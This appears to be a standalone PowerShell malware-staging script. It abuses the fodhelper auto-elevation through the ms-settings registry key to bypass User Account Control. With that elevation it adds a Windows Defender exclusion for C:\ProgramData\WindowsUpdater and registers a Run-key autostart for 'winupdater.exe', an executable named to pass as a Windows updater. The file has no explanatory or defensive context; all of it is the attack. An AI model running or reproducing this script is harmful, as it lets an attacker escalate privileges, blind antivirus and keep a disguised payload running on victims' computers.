New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -WindowStyle hidden -c Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowsUpdater' -Force" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
fodhelper

Start-Sleep -Seconds 0.8

Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -WindowStyle hidden New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name 'winupdater' -Value 'C:\ProgramData\WindowsUpdater\winupdater.exe' -Force -PropertyType 'String'" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
fodhelper
